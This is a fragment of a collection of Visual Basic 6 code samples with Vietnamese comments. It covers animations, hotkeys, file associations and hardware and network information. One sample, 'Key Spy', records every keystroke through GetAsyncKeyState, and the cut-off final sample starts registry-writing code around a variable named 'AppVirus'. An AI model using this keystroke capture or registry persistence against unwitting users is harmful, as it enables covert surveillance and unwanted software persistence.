  lpClassName = Left$(lpClassName, RetVal)
  GetClsName = lpClassName
  
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073112023110</MaVD>
    <NoiDung>Option Explicit

Private Sub command1_Click()
    Randomize Timer                         'Init Rnd

    'Declarations
    Dim StartTime(100)                      'Starttime of a up/down movement
    Dim DownMovement(100) As Boolean        'are we doing a up or down movement ???
    Dim MoveDistance As Double              'distance target has moved since the start of the movement
    Dim YPos(100) As Double                 'Holds the y position of a letter
    Dim MovementDone(100) As Boolean        'Is set to true when a up / down movement is completed
    Dim StartHeight(100) As Double               'From which hight will the letter fall down ?
    Dim UpMovementTime(100) As Double            'How long will it the letter take to move up
    Dim PowerLoss(100) As Double                 'losing xx% of power when touching the ground
    Dim Message As String                   'Message you want to display
    Dim Looop As Integer                    'Loop var
    Dim TextColor(100) As ColorConstants    'Color of one letter

    
    'Settings
    
    Picture1.ScaleMode = 4
    Picture1.FontName = "Courier New"
    
    Message = "Ohh my god ! It's raining letters today !!! Contact me: overkillpage@gmx.net"    'Message you want to display
    
    For Looop = 1 To Len(Message)
    
        PowerLoss(Looop) = 0.2 + ((Rnd * 25) / 100)                  'losing xx% of power when touching the ground
        StartHeight(Looop) = 0
        TextColor(Looop) = RGB(80 + Looop * 2, 80 + Looop * 2, 255)
    
    Next Looop
        
    For Looop = 1 To Len(Message)
        StartTime(Looop) = Timer                       'Setting up startime for a following movement, needed for calculation of position
    Next Looop
    
    Do
        
        Picture1.Cls                             'Clear picturebox
        
        'Looping throung the textmessage
        For Looop = 1 To Len(Message)
        
        
            If DownMovement(Looop) = True Then
                
                MoveDistance = (StartHeight(Looop) + (0.5 * 9.81 * ((Timer - StartTime(Looop)) ^ 2))) 'Calculating falling distance
                
                If YPos(Looop) &gt;= Picture1.ScaleHeight - 1 Then MovementDone(Looop) = True     'The letter reached the bottom border. The Downmovement is complete
        
            Else
                MoveDistance = (StartHeight(Looop) + (0.5 * 9.81 * (UpMovementTime(Looop) - (Timer - StartTime(Looop))) ^ 2)) 'Calculating falling distance
                
                If YPos(Looop) &lt;= StartHeight(Looop) + 0.1 Then MovementDone(Looop) = True      'The letter reached the max. height. The upmovement is complete
                
            End If
            
            YPos(Looop) = MoveDistance
            
            If YPos(Looop) &gt; Picture1.ScaleHeight - 1 Then                                   'If the letter fell picture1 of our picturebox ;) we fix it
                YPos(Looop) = Picture1.ScaleHeight - 1                                       'At the bottom position
            End If
            
            Picture1.CurrentX = Picture1.ScaleWidth / 2 - Int((Len(Message) / 2)) + Looop
            Picture1.CurrentY = YPos(Looop)                                                  'Setting the letters y position
            Picture1.ForeColor = TextColor(Looop)                                            'Setting the letters color
            Picture1.Print Mid(Message, Looop, 1)                                            'Text picture1put
        
        Next Looop
        
        DoEvents
    
        For Looop = 1 To Len(Message)
        
            If MovementDone(Looop) = True Then
                
                If DownMovement(Looop) = True Then     'Switch between up/downmovement
                    DownMovement(Looop) = False
                    StartHeight(Looop) = StartHeight(Looop) + ((Picture1.ScaleHeight - StartHeight(Looop)) * PowerLoss(Looop))   'New Startheight, because of speed lost ?!?!
                    UpMovementTime(Looop) = Sqr((Picture1.ScaleHeight - StartHeight(Looop)) / (0.5 * 9.81))        'How long will the NEXT upmovement last ???
                Else
                    DownMovement(Looop) = True
                End If
                
                StartTime(Looop) = Timer               'Set the StartTime of a new movement
                MovementDone(Looop) = False
            End If
            
         Next Looop
                
    Loop 'Until StartHeight = picture1.ScaleHeight
    
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>072912042906</MaVD>
    <NoiDung>'Module code:
Public ASCC(5) As String			
Public Letters() As String			' Chuỗi ký tự
Public TXT As String
Public CurLetter As Integer
Public TEXTT As String
Public r As Integer


'Form code:
Private Sub Command2_Click()
    Label1.Caption = ""
End Sub

Private Sub Command3_Click()
    End
End Sub

Private Sub Command1_Click()
    TXT = InputBox("Enter Text")            ' Nhập ký tự
    
    ReDim Preserve Letters(0)
    ReDim Preserve Letters(Len(TXT))
    Label1 = ""
    CurLetter = 0
    
    For l = 1 To Len(TXT)
        Letters(l) = Mid(TXT, l, 1)
    Next
    
    Timer2.Enabled = True
End Sub

Private Sub Form_Load()
    Command1.Caption = "Start"
    Command2.Caption = "Clear"
    Command3.Caption = "Exit"
    Timer1.Enabled = False
    Timer2.Enabled = False
    Timer1.Interval = 50
    Timer2.Interval = 5
End Sub

Private Sub Timer1_Timer()
    r = r + 1
    Label1.Caption = TEXTT
    Label1.Caption = Label1.Caption &amp; "_"
    If r = 6 Then
    r = 0
      If 65 &lt; Asc(Letters(CurLetter)) &lt; 90 Then
      Label1.Caption = TEXTT
       Label1.Caption = Label1.Caption &amp; Letters(CurLetter)
       TEXTT = Label1
       Timer2.Enabled = True
       Timer1.Enabled = False
         Else
            Label1.Caption = TEXTT
       Label1.Caption = Label1.Caption &amp; Chr$(Asc(Letters(CurLetter)) - 32)
       TEXTT = Label1
       Timer2.Enabled = True
       Timer1.Enabled = False
      End If
      
    End If
   
End Sub

Private Sub Timer2_Timer()
    CurLetter = CurLetter + 1
    
    If CurLetter &gt; Len(TXT) Then
       GoTo HERE:
    End If
    
    TEXTT = Label1
    Timer1.Enabled = True
    Timer2.Enabled = False
    
HERE:
    Timer2.Enabled = False
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070012050007</MaVD>
    <NoiDung>'Trong Module :
Public Const DT_CENTER = &amp;H1
Public Const DT_WORDBREAK = &amp;H10
Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Declare Function DrawTextEx Lib "user32" Alias "DrawTextExA" (ByVal hDC As Long, ByVal lpsz As String, ByVal n As Long, lpRect As RECT, ByVal un As Long, ByVal lpDrawTextParams As Any) As Long
Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Global Cnt As Long, sSave As String, sOld As String, Ret As String
Dim Tel As Long
Function GetPressedKey() As String
    For Cnt = 32 To 128
        If GetAsyncKeyState(Cnt) &lt;&gt; 0 Then
            GetPressedKey = Chr$(Cnt)
            Exit For
        End If
    Next Cnt
End Function
Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    Ret = GetPressedKey
    If Ret &lt;&gt; sOld Then
        sOld = Ret
        sSave = sSave + sOld
    End If
End Sub

'Trong Form :
Private Sub Form_Load()
    Me.Caption = "Key Spy"
    SetTimer Me.hwnd, 0, 1, AddressOf TimerProc
End Sub
Private Sub Form_Paint()
    Dim R As RECT
    Const mStr = "Nao bat dau go di khi ban an dau X de thoat ban se thay bat ngo thu vi day."
    Me.Cls
    Me.ScaleMode = vbPixels
    SetRect R, 0, 0, Me.ScaleWidth, Me.ScaleHeight
    DrawTextEx Me.hDC, mStr, Len(mStr), R, DT_WORDBREAK Or DT_CENTER, ByVal 0&amp;
End Sub
Private Sub Form_Resize()
    Form_Paint
End Sub
Private Sub Form_Unload(Cancel As Integer)
    KillTimer Me.hwnd, 0
    MsgBox sSave
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070312050308</MaVD>
    <NoiDung>'Trong Module :
Declare Function SendMessage Lib "user32" Alias _
"SendMessageA" (ByVal hwnd As Long, _
ByVal wMsg As Long, ByVal wParam As Long, _
lParam As Long) As Long
Declare Function DefWindowProc Lib "user32" _
Alias "DefWindowProcA" (ByVal hwnd As Long, _
ByVal wMsg As Long, ByVal wParam As Long, _
ByVal lParam As Long) As Long
Public Const WM_SETHOTKEY = &amp;H32
Public Const WM_SHOWWINDOW = &amp;H18
Public Const HK_SHIFTA = &amp;H141 'Shift + A
Public Const HK_SHIFTB = &amp;H142 'Shift * B
Public Const HK_CONTROLA = &amp;H241 'Control + A
Public Const HK_ALTZ = &amp;H45A

'The value of the key-combination has to
'declared in lowbyte/highbyte-format
'That means as a hex-number: the last two
'characters specify the lowbyte (e.g.: 41 = a),
'the first the highbyte (e.g.: 01 = 1 = Shift)

'Trong Form :
Private Sub Form_Load()
    Me.WindowState = vbMinimized
    'Let windows know what hotkey you want for
    'your app, setting of lParam has no effect
    erg&amp; = SendMessage(Me.hwnd, WM_SETHOTKEY, HK_ALTZ, 0)
    'Check if succesfull
    If erg&amp; &lt;&gt; 1 Then
        MsgBox "You need another hotkey", vbOKOnly, "Error"
    End If
    'Tell windows what it should do, when the hotkey
    'is pressed -&gt; show the window!
    'The setting of wParam and lParam has no effect
    erg&amp; = DefWindowProc(Me.hwnd, WM_SHOWWINDOW, 0, 0)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>071612051609</MaVD>
    <NoiDung>'----------- Bạn tạo một module mới và dán đoạn mã này vào

'Các hàm API cần thiết 
Private Declare Function RegCreateKey Lib "advapi32.dll" _
Alias "RegCreateKeyA" (ByVal hKey As Long, _
ByVal lpSubKey As String, _
phkResult As Long) As Long

Private Declare Function RegSetValue Lib "advapi32.dll" _
Alias "RegSetValueA" (ByVal hKey As Long, _
ByVal lpSubKey As String, _
ByVal dwType As Long, _
ByVal lpData As String, _
ByVal cbData As Long) As Long 
'Thực chất của việc tạo Icon riêng cho ứng dụng là việc bạn đăng kí cho Registry của Window biết là bạn đã đăng nhập vào "quốc gia" của họ 
'Các hằng số mang giá trị phản hồi từ Registry 
Const ERROR_SUCCESS = 0&amp;
Const ERROR_BADDB = 1&amp;
Const ERROR_BADKEY = 2&amp;
Const ERROR_CANTOPEN = 3&amp;
Const ERROR_CANTREAD = 4&amp;
Const ERROR_CANTWRITE = 5&amp;
Const ERROR_OUTOFMEMORY = 6&amp;
Const ERROR_INVALID_PARAMETER = 7&amp;
Const ERROR_ACCESS_DENIED = 8&amp; 
Private Const HKEY_CLASSES_ROOT = &amp;H80000000
Private Const MAX_PATH = 260&amp;
Private Const REG_SZ = 1 
'Hàm API cần thiết
Private Declare Sub SHChangeNotify Lib "shell32.dll" _
(ByVal wEventId As Long, _
ByVal uFlags As Long, _
dwItem1 As Any, _
dwItem2 As Any) 
Const SHCNE_ASSOCCHANGED = &amp;H8000000
Const SHCNF_IDLIST = &amp;H0&amp; 
'THủ tục dùng để đăng kí Icon cho chương trình 
Public Sub Tao_File_He_Thong()
'Giả sử rằng chương trình của bạn sẽ đăng kí ch việc thay đổi các tập tin có phần mở rộng là "*.mp3". 
Dim sKeyName As String 'Nắm tên khoá trong Reg
Dim sKeyValue As String ''Nắm một giá trị của khoá trong Reg 
Dim Ret&amp; 
Dim lphKey&amp; 
Dim Path As String 
Path = App.Path
If Right(Path, 1) &lt;&gt; "\" Then
Path = Path &amp; "\"
End If 
'Đăng kí cho một giá trị khoá gốc là tên ứng dụng của bạn. Ví dụ, bạn đặt tên cho chương trình là "Khunglongbeo.exe" thì giá trị của nó là "Khunglongbeo" và khi hoàn tất, tập tin sẽ có thuộc tính là "Khunglongbeo's File " (một hàng chữ mờ mờ bên dưới các file mà bạn thương gặp) 

sKeyName = "Khunglongbeo"
sKeyValue = "Khunglongbeo's File"
Ret&amp; = RegCreateKey&amp;(HKEY_CLASSES_ROOT, sKeyName, lphKey&amp;)
Ret&amp; = RegSetValue&amp;(lphKey&amp;, "", REG_SZ, sKeyValue, 0&amp;) 
'Đăng kí phần mở rộng "*.mp3" liên kết với ứng dụng mang tên "khunglongbeo" của bạn
sKeyName = ".mp3"
sKeyValue = "Khunglongbeo"
Ret&amp; = RegCreateKey&amp;(HKEY_CLASSES_ROOT, sKeyName, lphKey&amp;)
Ret&amp; = RegSetValue&amp;(lphKey&amp;, "", REG_SZ, sKeyValue, 0&amp;) 
sKeyName = "Khunglongbeo"
sKeyValue = Path &amp; "Khunglongbeo.exe %1"
Ret&amp; = RegCreateKey&amp;(HKEY_CLASSES_ROOT, sKeyName, lphKey&amp;)
Ret&amp; = RegSetValue&amp;(lphKey&amp;, "shell\open\command", REG_SZ, _
sKeyValue, MAX_PATH) 
'Lấy một Icon làm ảnh đại diện
sKeyName = "Khunglongbeo"
'Bạn hãy tìm một file .Ico bất kì và lưu vào đường dẫn sẽ qui định bên dưới (đường dẫn này tuỳ bạn qui định)
sKeyValue = Path &amp; "KLB.ico"
Ret&amp; = RegCreateKey&amp;(HKEY_CLASSES_ROOT, sKeyName, lphKey&amp;)
Ret&amp; = RegSetValue&amp;(lphKey&amp;, "DefaultIcon", REG_SZ, _
sKeyValue, MAX_PATH)

'Đổi Icon
SHChangeNotify SHCNE_ASSOCCHANGED, SHCNF_IDLIST, 0, 0 
End Sub 

'----------- Form code
'Phần mã này bạn hãy nhập vào Form1 
Private Sub Form_Load()
   Tao_File_He_Thong
End Sub </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073812053843</MaVD>
    <NoiDung>Dim Ports(0 To 100) As PORT_INFO_2
Const KT_TYPE = 0
Const PRINTER_ENUM_LOCAL = &amp;H2
Private Type PRINTER_INFO_1
flags As Long
pDescription As String
pName As String
pComment As String
End Type
Private Type DISPLAY_DEVICE
cb As Long
DeviceName As String * 32
DeviceString As String * 128
StateFlags As Long
DeviceID As String * 128
DeviceKey As String * 128
End Type
Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Type SYSTEM_INFO
dwOemID As Long
dwPageSize As Long
lpMinimumApplicationAddress As Long
lpMaximumApplicationAddress As Long
dwActiveProcessorMask As Long
dwNumberOrfProcessors As Long
dwProcessorType As Long
dwAllocationGranularity As Long
dwReserved As Long
End Type
Private Type PORT_INFO_2
pPortName As String
pMonitorName As String
pDescription As String
fPortType As Long
Reserved As Long
End Type
Private Type API_PORT_INFO_2
pPortName As Long
pMonitorName As Long
pDescription As Long
fPortType As Long
Reserved As Long
End Type
Const MAX_HOSTNAME_LEN = 132
Const MAX_DOMAIN_NAME_LEN = 132
Const MAX_SCOPE_ID_LEN = 260
Const MAX_ADAPTER_NAME_LENGTH = 260
Const MAX_ADAPTER_ADDRESS_LENGTH = 8
Const MAX_ADAPTER_DESCRIPTION_LENGTH = 132
Const ERROR_BUFFER_OVERFLOW = 111
Const MIB_IF_TYPE_ETHERNET = 1
Const MIB_IF_TYPE_TOKENRING = 2
Const MIB_IF_TYPE_FDDI = 3
Const MIB_IF_TYPE_PPP = 4
Const MIB_IF_TYPE_LOOPBACK = 5
Const MIB_IF_TYPE_SLIP = 6
Private Type IP_ADDR_STRING
Next As Long
IpAddress As String * 16
IpMask As String * 16
Context As Long
End Type
Private Type IP_ADAPTER_INFO
Next As Long
ComboIndex As Long
AdapterName As String * MAX_ADAPTER_NAME_LENGTH
Description As String * MAX_ADAPTER_DESCRIPTION_LENGTH
AddressLength As Long
Address(MAX_ADAPTER_ADDRESS_LENGTH - 1) As Byte
Index As Long
Type As Long
DhcpEnabled As Long
CurrentIpAddress As Long
IpAddressList As IP_ADDR_STRING
GatewayList As IP_ADDR_STRING
DhcpServer As IP_ADDR_STRING
HaveWins As Boolean
PrimaryWinsServer As IP_ADDR_STRING
SecondaryWinsServer As IP_ADDR_STRING
LeaseObtained As Long
LeaseExpires As Long
End Type
Private Type FIXED_INFO
HostName As String * MAX_HOSTNAME_LEN
DomainName As String * MAX_DOMAIN_NAME_LEN
CurrentDnsServer As Long
DnsServerList As IP_ADDR_STRING
NodeType As Long
ScopeId As String * MAX_SCOPE_ID_LEN
EnableRouting As Long
EnableProxy As Long
EnableDns As Long
End Type
Private Declare Function GetNetworkParams Lib "IPHlpApi" (FixedInfo As Any, pOutBufLen As Long) As Long
Private Declare Function GetAdaptersInfo Lib "IPHlpApi" (IpAdapterInfo As Any, pOutBufLen As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function EnumPorts Lib "winspool.drv" Alias "EnumPortsA" (ByVal pName As String, ByVal Level As Long, ByVal lpbPorts As Long, ByVal cbBuf As Long, pcbNeeded As Long, pcReturned As Long) As Long
Private Declare Function lstrlenW Lib "kernel32" (ByVal lpString As Long) As Long
Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (pTo As Any, uFrom As Any, ByVal lSize As Long)
Private Declare Function HeapAlloc Lib "kernel32" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Function GetProcessHeap Lib "kernel32" () As Long
Private Declare Function HeapFree Lib "kernel32" (ByVal hHeap As Long, ByVal dwFlags As Long, lpMem As Any) As Long
Private Declare Function EnumDisplayDevices Lib "user32" Alias "EnumDisplayDevicesA" (Unused As Any, ByVal iDevNum As Long, lpDisplayDevice As DISPLAY_DEVICE, ByVal dwFlags As Long) As Boolean
Private Declare Function EnumPrinters Lib "winspool.drv" Alias "EnumPrintersA" (ByVal flags As Long, ByVal name As String, ByVal Level As Long, pPrinterEnum As Long, ByVal cdBuf As Long, pcbNeeded As Long, pcReturned As Long) As Long
Private Declare Function lstrcpy Lib "kernel32.dll" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As Long) As Long
Private Declare Function lstrlen Lib "kernel32.dll" Alias "lstrlenA" (ByVal lpString As Long) As Long
Private Declare Function GetKeyboardType Lib "user32" (ByVal nTypeFlag As Long) As Long

'------------ Liệt kê tên của Card màn hình
Private Sub Ten_Card_ManHinh()
    Dim DD As DISPLAY_DEVICE
    DD.cb = Len(DD)
    If EnumDisplayDevices(ByVal 0&amp;, 0, DD, ByVal 0&amp;) Then
        Me.Print "Ten cua card man hình : " + Left$(DD.DeviceString, InStr(1, DD.DeviceString, Chr$(0)) - 1)
    Else
        Me.Print "Khong thay card man hình"
    End If
End Sub

'------------ Liệt kê danh sách tên máy in
Private Sub Ten_Cac_May_In()
    Dim longbuffer() As Long
    Dim printinfo() As PRINTER_INFO_1
    Dim numbytes As Long
    Dim numneeded As Long
    Dim numprinters As Long
    Dim c As Integer, retval As Long
    numbytes = 3076
    ReDim longbuffer(0 To numbytes / 4) As Long
    retval = EnumPrinters(PRINTER_ENUM_LOCAL, "", 1, longbuffer(0), numbytes, numneeded, numprinters)
    If retval = 0 Then
        numbytes = numneeded
        ReDim longbuffer(0 To numbytes / 4) As Long
        retval = EnumPrinters(PRINTER_ENUM_LOCAL, "", 1, longbuffer(0), numbytes, numneeded, numprinters)
        If retval = 0 Then
            Debug.Print "Could not successfully enumerate the printes."
            End
        End If
    End If
    If numprinters &lt;&gt; 0 Then ReDim printinfo(0 To numprinters - 1) As PRINTER_INFO_1
    For c = 0 To numprinters - 1
        printinfo(c).flags = longbuffer(4 * c)
        printinfo(c).pDescription = Space(lstrlen(longbuffer(4 * c + 1)))
        retval = lstrcpy(printinfo(c).pDescription, longbuffer(4 * c + 1))
        printinfo(c).pName = Space(lstrlen(longbuffer(4 * c + 2)))
        retval = lstrcpy(printinfo(c).pName, longbuffer(4 * c + 2))
        printinfo(c).pComment = Space(lstrlen(longbuffer(4 * c + 3)))
        retval = lstrcpy(printinfo(c).pComment, longbuffer(4 * c + 3))
    Next c
    For c = 0 To numprinters - 1
        Me.Print "Ten cua may in thu "; c + 1; " la : "; printinfo(c).pName
    Next c
End Sub

'------------ Hàm dùng để kiểu bàn phím
Private Sub Ban_Phim()
    Select Case GetKeyboardType(KT_TYPE)
        Case 1
            Me.Print "Keyboard type: IBM PC/XT or compatible (83-key) keyboard"
        Case 2
            Me.Print "Keyboard type: Olivetti "; ICO; " (102-key) keyboard"
        Case 3
            Me.Print "Keyboard type: IBM PC/AT (84-key) or similar keyboard"
        Case 4
            Me.Print "Keyboard type: IBM enhanced (101- or 102-key) keyboard"
        Case 5
            Me.Print "Keyboard type: Nokia 1050 and similar keyboards"
        Case 6
            Me.Print "Keyboard type: Nokia 9140 and similar keyboards"
        Case 7
            Me.Print "Keyboard type: Japanese keyboard"
        Case Else
            Me.Print "Keyboard type: Unknown"
    End Select
End Sub

'------------- Hàm lấy số serial và hiệu của CPU
Private Sub Lay_CPU()
    Dim SInfo As SYSTEM_INFO
    GetSystemInfo SInfo
    Me.Print "So luong CPU : " + Str$(SInfo.dwNumberOrfProcessors)
    Me.Print "Doi CPU : " + Str$(SInfo.dwProcessorType)
    Me.Print "Dia chi bo nho duoi : " + Str$(SInfo.lpMinimumApplicationAddress)
    Me.Print "Dia chi bo nho tren : " + Str$(SInfo.lpMaximumApplicationAddress)
End Sub

'------------ Danh sách các Ports trong máy
Public Function TrimStr(strName As String) As String
    Dim x As Integer
    x = InStr(strName, vbNullChar)
    If x &gt; 0 Then TrimStr = Left(strName, x - 1) Else TrimStr = strName
End Function

Public Function LPSTRtoSTRING(ByVal lngPointer As Long) As String
    Dim lngLength As Long
    lngLength = lstrlenW(lngPointer) * 2
    LPSTRtoSTRING = String(lngLength, 0)
    CopyMem ByVal StrPtr(LPSTRtoSTRING), ByVal lngPointer, lngLength
    LPSTRtoSTRING = TrimStr(StrConv(LPSTRtoSTRING, vbUnicode))
End Function

Public Function GetAvailablePorts(ServerName As String) As Long
    Dim ret As Long
    Dim PortsStruct(0 To 100) As API_PORT_INFO_2
    Dim pcbNeeded As Long
    Dim pcReturned As Long
    Dim TempBuff As Long
    Dim i As Integer
    ret = EnumPorts(ServerName, 2, TempBuff, 0, pcbNeeded, pcReturned)
    TempBuff = HeapAlloc(GetProcessHeap(), 0, pcbNeeded)
    ret = EnumPorts(ServerName, 2, TempBuff, pcbNeeded, pcbNeeded, pcReturned)
    If ret Then
        CopyMem PortsStruct(0), ByVal TempBuff, pcbNeeded
        For i = 0 To pcReturned - 1
            Ports(i).pDescription = LPSTRtoSTRING(PortsStruct(i).pDescription)
            Ports(i).pPortName = LPSTRtoSTRING(PortsStruct(i).pPortName)
            Ports(i).pMonitorName = LPSTRtoSTRING(PortsStruct(i).pMonitorName)
            Ports(i).fPortType = PortsStruct(i).fPortType
        Next
    End If
    GetAvailablePorts = pcReturned
    If TempBuff Then HeapFree GetProcessHeap(), 0, TempBuff
End Function

Private Sub Lay_Ports()
    Dim NumPorts As Long
    Dim i As Integer
    NumPorts = GetAvailablePorts("")
    Me.Print "Danh sach cac Port hien tai"
    For i = 0 To NumPorts - 1
        Me.Print Ports(i).pPortName
    Next
End Sub

'------------ Thôngt tin về tình trạng mạng và thông số card mạng
Private Sub Lay_Adepter()
    Dim error As Long
    Dim FixedInfoSize As Long
    Dim AdapterInfoSize As Long
    Dim i As Integer
    Dim PhysicalAddress As String
    Dim NewTime As Date
    Dim AdapterInfo As IP_ADAPTER_INFO
    Dim Adapt As IP_ADAPTER_INFO
    Dim AddrStr As IP_ADDR_STRING
    Dim FixedInfo As FIXED_INFO
    Dim Buffer As IP_ADDR_STRING
    Dim pAddrStr As Long
    Dim pAdapt As Long
    Dim Buffer2 As IP_ADAPTER_INFO
    Dim FixedInfoBuffer() As Byte
    Dim AdapterInfoBuffer() As Byte
    
    FixedInfoSize = 0
    error = GetNetworkParams(ByVal 0&amp;, FixedInfoSize)
    If error &lt;&gt; 0 Then
        If error &lt;&gt; ERROR_BUFFER_OVERFLOW Then
            Me.Print "GetNetworkParams sizing failed with error " &amp; error
            Exit Sub
        End If
    End If
    ReDim FixedInfoBuffer(FixedInfoSize - 1)
    error = GetNetworkParams(FixedInfoBuffer(0), FixedInfoSize)
    If error = 0 Then
        CopyMemory FixedInfo, FixedInfoBuffer(0), Len(FixedInfo)
        Me.Print "Host Name: " &amp; FixedInfo.HostName 'host name
        Me.Print "DNS Servers: " &amp; FixedInfo.DnsServerList.IpAddress 'dns server IP
        pAddrStr = FixedInfo.DnsServerList.Next
        Do While pAddrStr &lt;&gt; 0
            CopyMemory Buffer, ByVal pAddrStr, Len(Buffer)
            Me.Print "DNS Servers: " &amp; Buffer.IpAddress 'dns server IP
            pAddrStr = Buffer.Next
        Loop
        
        Select Case FixedInfo.NodeType 'node type
            Case 1
                Me.Print "Node type: Broadcast"
            Case 2
                Me.Print "Node type: Peer to peer"
            Case 4
                Me.Print "Node type: Mixed"
            Case 8
                Me.Print "Node type: Hybrid"
            Case Else
                Me.Print "Unknown node type"
        End Select
        
        Me.Print "NetBIOS Scope ID: " &amp; FixedInfo.ScopeId 'scope ID
        'routing
        If FixedInfo.EnableRouting Then
            Me.Print "IP Routing Enabled "
        Else
            Me.Print "IP Routing not enabled"
        End If
        ' proxy
        If FixedInfo.EnableProxy Then
            Me.Print "WINS Proxy Enabled "
        Else
            Me.Print "WINS Proxy not Enabled "
        End If
        ' netbios
        If FixedInfo.EnableDns Then
            Me.Print "NetBIOS Resolution Uses DNS "
        Else
            Me.Print "NetBIOS Resolution Does not use DNS "
        End If
        
    Else
        Me.Print "GetNetworkParams failed with error " &amp; error
        Exit Sub
    End If
    
    
    AdapterInfoSize = 0
    error = GetAdaptersInfo(ByVal 0&amp;, AdapterInfoSize)
    If error &lt;&gt; 0 Then
        If error &lt;&gt; ERROR_BUFFER_OVERFLOW Then
            Me.Print "GetAdaptersInfo sizing failed with error " &amp; error
            Exit Sub
        End If
    End If
    ReDim AdapterInfoBuffer(AdapterInfoSize - 1)
    
    error = GetAdaptersInfo(AdapterInfoBuffer(0), AdapterInfoSize)
    If error &lt;&gt; 0 Then
        Me.Print "GetAdaptersInfo failed with error " &amp; error
        Exit Sub
    End If
    CopyMemory AdapterInfo, AdapterInfoBuffer(0), Len(AdapterInfo)
    pAdapt = AdapterInfo.Next
    Do While pAdapt &lt;&gt; 0
        CopyMemory Buffer2, AdapterInfo, Len(Buffer2)
        Select Case Buffer2.Type
            Case MIB_IF_TYPE_ETHERNET
                Me.Print "Ethernet adapter "
            Case MIB_IF_TYPE_TOKENRING
                Me.Print "Token Ring adapter "
            Case MIB_IF_TYPE_FDDI
                Me.Print "FDDI adapter "
            Case MIB_IF_TYPE_PPP
                Me.Print "PPP adapter"
            Case MIB_IF_TYPE_LOOPBACK
                Me.Print "Loopback adapter "
            Case MIB_IF_TYPE_SLIP
                Me.Print "Slip adapter "
            Case Else
                Me.Print "Other adapter "
        End Select
        Me.Print " AdapterName: " &amp; Buffer2.AdapterName
        Me.Print "AdapterDescription: " &amp; Buffer2.Description 'adatpter name
        For i = 0 To Buffer2.AddressLength - 1
            PhysicalAddress = PhysicalAddress &amp; Hex(Buffer2.Address(i))
            If i &lt; Buffer2.AddressLength - 1 Then
                PhysicalAddress = PhysicalAddress &amp; "-"
            End If
        Next
        Me.Print "Physical Address: " &amp; PhysicalAddress 'mac address
        If Buffer2.DhcpEnabled Then
            Me.Print "DHCP Enabled "
        Else
            Me.Print "DHCP disabled"
        End If
        pAddrStr = Buffer2.IpAddressList.Next
        Do While pAddrStr &lt;&gt; 0
            CopyMemory Buffer, Buffer2.IpAddressList, LenB(Buffer)
            Me.Print "IP Address: " &amp; Buffer.IpAddress
            Me.Print "Subnet Mask: " &amp; Buffer.IpMask
            pAddrStr = Buffer.Next
            If pAddrStr &lt;&gt; 0 Then
                CopyMemory Buffer2.IpAddressList, ByVal pAddrStr, Len(Buffer2.IpAddressList)
            End If
        Loop
        Me.Print "Default Gateway: " &amp; Buffer2.GatewayList.IpAddress
        pAddrStr = Buffer2.GatewayList.Next
        Do While pAddrStr &lt;&gt; 0
            CopyMemory Buffer, Buffer2.GatewayList, Len(Buffer)
            Me.Print "IP Address: " &amp; Buffer.IpAddress
            pAddrStr = Buffer.Next
            If pAddrStr &lt;&gt; 0 Then
                CopyMemory Buffer2.GatewayList, ByVal pAddrStr, Len(Buffer2.GatewayList)
            End If
        Loop
        Me.Print "DHCP Server: " &amp; Buffer2.DhcpServer.IpAddress
        Me.Print "Primary WINS Server: " &amp; Buffer2.PrimaryWinsServer.IpAddress
        Me.Print "Secondary WINS Server: " &amp; Buffer2.SecondaryWinsServer.IpAddress
        NewTime = CDate(Adapt.LeaseObtained)
        Me.Print "Lease Obtained: " &amp; CStr(NewTime)
        NewTime = CDate(Adapt.LeaseExpires)
        Me.Print "Lease Expires : " &amp; CStr(NewTime)
        pAdapt = Buffer2.Next
        If pAdapt &lt;&gt; 0 Then
            CopyMemory AdapterInfo, ByVal pAdapt, Len(AdapterInfo)
        End If
    Loop
End Sub

Private Sub Form_Load()
    Me.WindowState = 2
    Me.AutoRedraw = True
    Ten_Card_ManHinh
    Ten_Cac_May_In
    Ban_Phim
    Lay_CPU
    Lay_Ports
    Lay_Adepter
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074512054553</MaVD>
    <NoiDung>Option Explicit
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Const REG_SZ = 1 ' Unicode nul terminated string
Private Const REG_BINARY = 3 ' Free form binary
Private Const HKEY_CURRENT_USER = &amp;H80000001
Dim AppVirus As String

Private Sub SaveString(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    RegCreateKey hKey, strPath, Ret
